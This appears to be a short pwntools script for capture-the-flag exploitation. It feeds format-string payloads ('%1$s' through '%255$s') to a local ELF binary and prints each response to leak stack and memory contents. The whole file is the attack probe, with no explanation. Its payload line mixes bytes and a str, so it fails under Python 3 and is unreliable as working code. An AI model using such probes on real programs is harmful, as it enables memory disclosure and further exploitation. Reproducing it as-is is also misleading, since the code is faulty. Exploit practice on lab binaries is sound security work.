import pwn
elf=pwn.ELF('pathToElf')
for i in range(1,256):
    payload=b"".join([
        b"%"+ str(i).encode("utf-8")+"$s"
    ])
    p=elf.process()
    p.sendline(payload)
    response= p.recvall().decode('latin-1')
    print(response)
